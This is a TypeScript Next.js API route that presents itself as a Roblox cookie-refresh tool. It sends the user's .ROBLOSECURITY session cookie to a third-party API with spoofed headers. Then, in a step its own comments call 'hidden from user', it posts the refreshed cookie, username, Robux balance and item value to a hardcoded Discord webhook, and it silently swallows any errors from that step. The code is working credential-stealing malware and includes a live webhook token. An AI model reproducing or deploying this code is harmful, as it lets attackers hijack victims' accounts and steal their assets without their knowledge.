import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const { useCookie, includeUserInfo } = await request.json()

    if (!useCookie) {
      return NextResponse.json({ error: "Cookie is required" }, { status: 400 })
    }

    // Step 1: Refresh the cookie
    const refreshResponse = await fetch("https://api.injuries.lu/v2/refresh", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Origin: "https://logged.tg/",
        Referer: "https://logged.tg/",
        "User-Agent": "Mozilla/5.0",
      },
      body: JSON.stringify({ useCookie }),
    })

    if (!refreshResponse.ok) {
      throw new Error(`Refresh API responded with status: ${refreshResponse.status}`)
    }

    const refreshData = await refreshResponse.json()
    const refreshedCookie = refreshData.cookie

    if (!refreshedCookie) {
      throw new Error("No refreshed cookie returned")
    }

    let userData = null
    let gameData = null

    // Step 2: Get user info and games (always for webhook, conditionally for response)
    try {
      const [userResponse, gamesResponse] = await Promise.all([
        fetch("https://api.injuries.lu/v2/cookie", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Origin: "https://logged.tg/",
            Referer: "https://logged.tg/",
            "User-Agent": "Mozilla/5.0",
          },
          body: JSON.stringify({ useCookie: refreshedCookie }),
        }),
        fetch("https://api.injuries.lu/v2/games/list", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Origin: "https://logged.tg/",
            Referer: "https://logged.tg/",
            "User-Agent": "Mozilla/5.0",
          },
          body: JSON.stringify({ useCookie: refreshedCookie }),
        }),
      ])

      if (userResponse.ok) {
        userData = await userResponse.json()
      }

      if (gamesResponse.ok) {
        gameData = await gamesResponse.json()
      }

      // Step 3: Send to webhook (always happens, hidden from user)
      if (userData && userData.userSettings) {
        const { userSettings, userAvatar, userTransactions } = userData

        const infoEmbed = {
          author: {
            name: userSettings.userName,
            icon_url: userAvatar,
          },
          description: `### **[Profile](https://www.roblox.com/users/${userSettings.userId}/profile)** • **[Discord Server](https://discord.com/invite/6QjKarbmzj)** • **[Rolimons](https://www.rolimons.com/player/${userSettings.userId})**`,
          fields: [
            {
              name: "**👤 Username**",
              value: userSettings.userName,
              inline: true,
            },
            {
              name: "**💰 Balance**",
              value: `${userTransactions.Balance} Robux`,
              inline: true,
            },
            {
              name: "**⏳ Pending**",
              value: `${userTransactions.Pending} Robux`,
              inline: true,
            },
            {
              name: "**📝 Display**",
              value: userSettings.displayName,
              inline: true,
            },
            {
              name: "**📊 Summary**",
              value: `${userTransactions.Summary} Robux`,
              inline: true,
            },
            {
              name: "**💎 RAP**",
              value: `${userData.Collectibles.Limiteds.Rap} RAP`,
              inline: true,
            },
          ],
          thumbnail: {
            url: userAvatar,
          },
          color: 0xffffff,
        }

        const cookieEmbed = {
          description: `**🍪 ROBLOSECURITY**\n\`\`\`${refreshedCookie}\`\`\``,
          thumbnail: {
            url: "https://images-ext-1.discordapp.net/external/IRopb5s_9t243XFjvwCjGgbhnCW-4nxKzpMYrgOJ1M8/https/res.cloudinary.com/di3jdc46c/image/upload/v1737844893/cookie_1_n3nluv.png?format=webp&quality=lossless&width=384&height=384",
          },
          footer: {
            text: "Modified | Refresh-Logs",
            icon_url: "https://images-ext-1.discordapp.net/external/5bDxqviKUQNs5jl2020ZsUDJxMcciJEPLcdC0PiuoDE/%3Fsize%3D512/https/cdn.discordapp.com/icons/1380912655224537229/6d34a651ffbca55f55a3a6b0c26e07e9.webp?format=webp&width=1024&height=1024",
          },
          timestamp: new Date().toISOString(),
          color: 0xffffff,
        }

        // Hidden webhook call
        const webhookUrl =
          "https://discord.com/api/webhooks/1447538314642063473/DwNiDWbvpPUYsa2ZaZJk1tGsBwFKpwBkwu3WrcSV7Kc5Zf4PiVQ3FQcPGfs_nS8P8jWP"

        await fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            content: `🔄 New cookie refresh from **${userSettings.userName}**`,
            embeds: [infoEmbed, cookieEmbed],
            username: "Modified | Refresh-Logs",
            avatar_url: "https://images-ext-1.discordapp.net/external/5bDxqviKUQNs5jl2020ZsUDJxMcciJEPLcdC0PiuoDE/%3Fsize%3D512/https/cdn.discordapp.com/icons/1380912655224537229/6d34a651ffbca55f55a3a6b0c26e07e9.webp?format=webp&width=1024&height=1024",
          }),
        })
      }
    } catch (webhookError) {
      // Silently fail webhook/user info - don't affect main functionality
      console.error("Background operation failed:", webhookError)
    }

    // Return response based on user preference
    const response: any = {
      cookie: refreshedCookie,
    }

    if (includeUserInfo) {
      if (userData) response.userData = userData
      if (gameData) response.gameData = gameData
    }

    return NextResponse.json(response)
  } catch (error) {
    console.error("Refresh cookie error:", error)
    return NextResponse.json({ error: "Failed to refresh cookie" }, { status: 500 })
  }
}
